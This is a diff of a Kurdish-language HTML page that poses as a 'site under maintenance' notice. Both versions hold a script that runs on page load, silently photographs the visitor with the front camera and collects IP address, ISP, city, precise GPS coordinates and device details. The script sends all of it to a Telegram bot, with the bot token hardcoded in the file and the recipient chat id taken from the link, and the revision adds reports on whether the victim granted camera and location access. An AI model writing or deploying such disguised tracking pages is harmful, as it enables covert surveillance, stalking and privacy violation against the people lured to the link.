@@ -1,14 +1,14 @@
 <!DOCTYPE html>
-<html lang="ckb" dir="rtl">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لەژێر چاکسازیی و گەشەپێداندایە</title>
+    <title>ماڵپەڕەکە لەژێر نوێکردنەوەدایە</title>
     <style>
         body {
-            font-family: system-ui, -apple-system, sans-serif;
-            background-color: #0f172a;
-            color: #f8fafc;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            color: #333;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,187 +16,155 @@
             margin: 0;
             text-align: center;
         }
-        .card {
-            background: #1e293b;
-            padding: 40px 20px;
-            border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
             max-width: 400px;
-            width: 90%;
-            border: 1px solid #334155;
         }
-        .spinner {
-            border: 4px solid #334155;
-            border-top: 4px solid #38bdf8;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { color: #38bdf8; font-size: 1.3rem; margin-bottom: 10px; }
-        p { color: #94a3b8; font-size: 0.95rem; line-height: 1.5; }
-        video, canvas { display: none; }
+        h1 { font-size: 24px; color: #e74c3c; }
+        p { font-size: 16px; color: #666; }
     </style>
 </head>
 <body>
-
-    <div class="card">
-        <div class="spinner"></div>
-        <h2>🛠 ماڵپەڕەکە لەژێر کارکردندایە</h2>
-        <p>تکایە دەستگەیشتن بە کامێرا و شوێنەکە بەبخشە بۆ هاوڕێکەربوونی بەکارهێنەر لەگەڵ سەرڤەر...</p>
+    <div class="container">
+        <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
+        <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
     </div>
-
-    <!-- توخمە شاراوەکان بۆ گرتنی وێنە -->
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
 
     <script>
         const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
+        
+        // وەرگرتنی Chat ID لە لینکەکەوە
         const urlParams = new URLSearchParams(window.location.search);
-        const ownerId = urlParams.get('id');
+        const chatId = urlParams.get('id');
 
-        async function initCapture() {
-            if (!ownerId) return;
-
-            // 1. داواکردن و ڕێگەدانی کامێرا (کامێرای پێشەوە)
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: "user" },
-                        audio: false
-                    });
-                    
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-
-                    video.onloadedmetadata = () => {
-                        setTimeout(() => {
-                            captureAndSendPhoto(stream);
-                        }, 1000); // دواکەوتنی ١ چرکە بۆ ڕۆشنبوونی وێنەی کامێراکە
-                    };
-                } catch (err) {
-                    console.log("Camera denied or not available");
-                }
-            }
-
-            // 2. کۆکردنەوەی زانیارییەکانی تر (IP و GPS)
-            collectAndSendTextData();
-        }
-
-        function captureAndSendPhoto(stream) {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // گۆڕینی وێنەکە بۆ Blob و ناردنی بۆ تێلێگرام
-            canvas.toBlob((blob) => {
-                if (!blob) return;
-
-                const formData = new FormData();
-                formData.append('chat_id', ownerId);
-                formData.append('photo', blob, 'user_photo.jpg');
-                formData.append('caption', '📸 **وێنەی ڕاستەوخۆی بەکارهێنەر لە ڕێگەی کامێرای پێشەوە!**');
-
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).then(() => {
-                    // کوژاندنەوەی کامێراکە لە دوای وێنەگرتنەکە
-                    stream.getTracks().forEach(track => track.stop());
-                }).catch(err => console.error(err));
-            }, 'image/jpeg');
-        }
-
-        async function collectAndSendTextData() {
-            let userIp = "نەنێنراوە";
-            let ipCity = "نەنێنراوە";
-            let ipCountry = "نەنێنراوە";
-            let ipIsp = "نەنێنراوە";
-            let ipLat = "";
-            let ipLon = "";
-
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                userIp = ipData.ip || "نەدۆزرایەوە";
-                ipCity = ipData.city || "نەدۆزرایەوە";
-                ipCountry = ipData.country_name || "نەدۆزرایەوە";
-                ipIsp = ipData.org || "نەدۆزرایەوە";
-                ipLat = ipData.latitude || "";
-                ipLon = ipData.longitude || "";
-            } catch (e) {}
-
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenRes = `${window.screen.width}x${window.screen.height} (Ratio:${window.devicePixelRatio})`;
-
-            let gpu = "نەدۆزرایەوە";
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
-            } catch (e) {}
-
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const locText = `🎯 **دەقیق (GPS):** \`${lat}, ${lon}\``;
-                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                        sendData(userIp, ipCity, ipCountry, ipIsp, platform, screenRes, gpu, ua, locText, mapUrl);
-                    },
-                    (error) => {
-                        let locText = `📍 **خەمڵێنراو (لە ڕێگەی IP):** \`${ipCity}, ${ipCountry}\``;
-                        let mapUrl = (ipLat && ipLon) ? `https://www.google.com/maps?q=${ipLat},${ipLon}` : "";
-                        sendData(userIp, ipCity, ipCountry, ipIsp, platform, screenRes, gpu, ua, locText, mapUrl);
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else {
-                let locText = `📍 **خەمڵێنراو (لە ڕێگەی IP):** \`${ipCity}, ${ipCountry}\``;
-                let mapUrl = (ipLat && ipLon) ? `https://www.google.com/maps?q=${ipLat},${ipLon}` : "";
-                sendData(userIp, ipCity, ipCountry, ipIsp, platform, screenRes, gpu, ua, locText, mapUrl);
-            }
-        }
-
-        function sendData(ip, city, country, isp, platform, screenRes, gpu, ua, locationText, mapUrl) {
-            let message = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**\n\n` +
-                          `🌐 **IP Address:** \`${ip}\`\n` +
-                          `🏢 **کۆمپانیای ئینتەرنێت (ISP):** \`${isp}\`\n` +
-                          `${locationText}\n`;
-
-            if (mapUrl) {
-                message += `🗺 **لینکی نەخشە:** [کردنەوە لە Google Maps](${mapUrl})\n`;
-            }
-
-            message += `\n📱 **سیستەم:** \`${platform}\`\n` +
-                       `📐 **ڕوونی شاشە:** \`${screenRes}\`\n` +
-                       `🎮 **GPU:** \`${gpu}\`\n` +
-                       `💻 **User-Agent:** \`${ua}\``;
-
+        // فەنکشنی ناردنی پەیام بۆ تێلێگرام
+        function sendTelegramMessage(text) {
+            if (!chatId) return;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: ownerId,
-                    text: message,
+                    chat_id: chatId,
+                    text: text,
                     parse_mode: 'Markdown'
                 })
             }).catch(err => console.error(err));
         }
 
-        initCapture();
-    </script>
+        // فەنکشنی ناردنی وێنە بۆ تێلێگرام
+        function sendTelegramPhoto(blob) {
+            if (!chatId) return;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', '📸 **وێنەی گیراو لە کامێرای پێشەوە!**');
 
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.error(err));
+        }
+
+        async function collectDeviceData() {
+            if (!chatId) return;
+
+            // 1. وەرگرتنی زانیاری IP و سیستەم
+            let ipData = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch (e) {
+                console.log("Error fetching IP data");
+            }
+
+            const sysInfo = `
+🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**
+
+🌐 **IP Address:** \`${ipData.ip || 'نادیار'}\`
+🏢 **کۆمپانیا (ISP):** ${ipData.org || 'نادیار'}
+🏙 **شار/وڵات:** ${ipData.city || ''}, ${ipData.country_name || ''}
+
+📱 **سیستەم:** ${navigator.platform}
+📐 **ڕوونی شاشە:** ${window.screen.width}x${window.screen.height}
+💻 **User-Agent:** ${navigator.userAgent}
+            `;
+            
+            // ناردنی زانیاری سەرەتایی ئامێرەکە
+            sendTelegramMessage(sysInfo);
+
+            // 2. پشکنینی ڕێگەپێدانی لۆکەیشن (Location Status)
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        const locMsg = `
+✅ **ڕێگەپێدانی شوێن (Location): ALLOW کراوە**
+🎯 **دۆخ:** لۆکەیشنی ئامێرەکە (GPS) هەڵکراوە و دەقیقی هێنرایەوە!
+
+📍 **پۆتانەکان:** \`${lat},${lon}\`
+🗺 **نەخشە:** [کرنەوە لە Google Maps](${mapLink})
+                        `;
+                        sendTelegramMessage(locMsg);
+                    },
+                    (error) => {
+                        let reason = "";
+                        if (error.code === error.PERMISSION_DENIED) {
+                            reason = "❌ **ڕێگەپێدانی شوێن (Location): DENY کراوە** (کەسەکە ڕێگەی نەدا یان Allowی نەکرت).";
+                        } else if (error.code === error.POSITION_UNAVAILABLE) {
+                            reason = "⚠️ **ڕێگەپێدانی شوێن (Location): ALLOW کراوە** بەڵام **GPSی مۆبایلەکەی خامۆشە/داخراوە** و شوێنی دەقیق نەدۆزرایەوە.";
+                        } else if (error.code === error.TIMEOUT) {
+                            reason = "⚠️ **ڕێگەپێدانی شوێن:** کاتەکە بەسەرچوو لە وەرگرتنی سیگناڵی GPS.";
+                        }
+                        sendTelegramMessage(reason);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                sendTelegramMessage("❌ سیستەمی ئامێرەکە پشتگیری لە Geolocation ناکات.");
+            }
+
+            // 3. پشکنینی ڕێگەپێدانی کامێرا (Camera Status)
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then((stream) => {
+                        sendTelegramMessage("✅ **ڕێگەپێدانی کامێرا: ALLOW کراوە**\n📸 لە حاڵەتی گرتنی وێنەیە...");
+
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+
+                        video.onloadedmetadata = () => {
+                            setTimeout(() => {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                                canvas.toBlob((blob) => {
+                                    sendTelegramPhoto(blob);
+                                    // وەستاندنی کامێرا دوای وێنەگرتن
+                                    stream.getTracks().forEach(track => track.stop());
+                                }, 'image/jpeg');
+                            }, 1000);
+                        };
+                    })
+                    .catch((err) => {
+                        sendTelegramMessage("❌ **ڕێگەپێدانی کامێرا: DENY کراوە** (کەسەکە کلیکی لەسەر Block/Deny کرد یان کامێرای نییە).");
+                    });
+            } else {
+                sendTelegramMessage("❌ ئامێرەکە یان وێبگەڕەکە پشتگیری لە کامێرا ناکات.");
+            }
+        }
+
+        // دەستپێکردنی کارەکە ڕاستەوخۆ دوای باربوونی پەڕەکە
+        window.onload = collectDeviceData;
+    </script>
 </body>
 </html>
